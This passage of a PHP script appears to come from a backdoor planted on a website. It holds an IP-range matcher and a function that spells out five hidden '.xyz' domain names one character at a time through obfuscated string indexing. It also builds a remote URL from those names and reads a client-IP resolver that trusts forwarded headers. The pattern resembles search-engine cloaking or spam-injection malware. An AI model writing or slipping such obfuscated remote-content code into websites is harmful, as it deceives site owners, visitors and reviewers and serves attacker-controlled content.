		$ipmin=sprintf("%u",ip2long($val[0]));		$ipmax=sprintf("%u",ip2long($val[1]));
		if($localIp >= $ipmin && $localIp <= $ipmax)
		{   
			return true; 
		} 
	}   
	return false;}
 
function RandAbcs($length = ""){
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_./:-";
    return ($str);
} 


 
function getarr(){
		global $O00O0O;
		$arr[0]=$O00O0O{14}.$O00O0O{0}.$O00O0O{7}.$O00O0O{7}.$O00O0O{18}.$O00O0O{12}.$O00O0O{0}.$O00O0O{11}.$O00O0O{11}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[1]=$O00O0O{2}.$O00O0O{20}.$O00O0O{2}.$O00O0O{4}.$O00O0O{0}.$O00O0O{18}.$O00O0O{7}.$O00O0O{14}.$O00O0O{15}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[2]=$O00O0O{2}.$O00O0O{8}.$O00O0O{11}.$O00O0O{19}.$O00O0O{12}.$O00O0O{0}.$O00O0O{17}.$O00O0O{10}.$O00O0O{4}.$O00O0O{19}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[3]=$O00O0O{18}.$O00O0O{17}.$O00O0O{0}.$O00O0O{2}.$O00O0O{12}.$O00O0O{0}.$O00O0O{11}.$O00O0O{11}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};$arr[4]=$O00O0O{7}.$O00O0O{14}.$O00O0O{0}.$O00O0O{1}.$O00O0O{2}.$O00O0O{12}.$O00O0O{0}.$O00O0O{11}.$O00O0O{11}.$O00O0O{63}.$O00O0O{23}.$O00O0O{24}.$O00O0O{25};
	return $arr;
}
	
function getthisdom(){
	$myArrs = getarr();
    return 'http://www.'.$myArrs[CENTERKEY].MYDIR;
} 
 
 

function get_real_ip(){
	
	
	   $ip = '';
    /**
     * resolve any proxies
     */
    if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
      } elseif (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
      } elseif (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED'];
      } elseif (isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
      } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_FORWARDED_FOR'];
      } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
        $ip = $_SERVER['HTTP_FORWARDED'];
      } else {
        $ip = $_SERVER['REMOTE_ADDR'];
      }
    }
    if (trim($ip) == '') {
      if (getenv('HTTP_X_FORWARDED_FOR')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
      } elseif (getenv('HTTP_CLIENT_IP')) {
        $ip = getenv('HTTP_CLIENT_IP');
      } else {
        $ip = getenv('REMOTE_ADDR');
      }
    }

    /**
     * sanitize for validity as an IPv4 or IPv6 address
     */
    $ip = preg_replace('~[^a-fA-F0-9.:%/,]~', '', $ip);

    /**
     *  if it's still blank, set to a single dot
     */
    if (trim($ip) == '') $ip = '.';

    return $ip;
	
	}
 
//file end
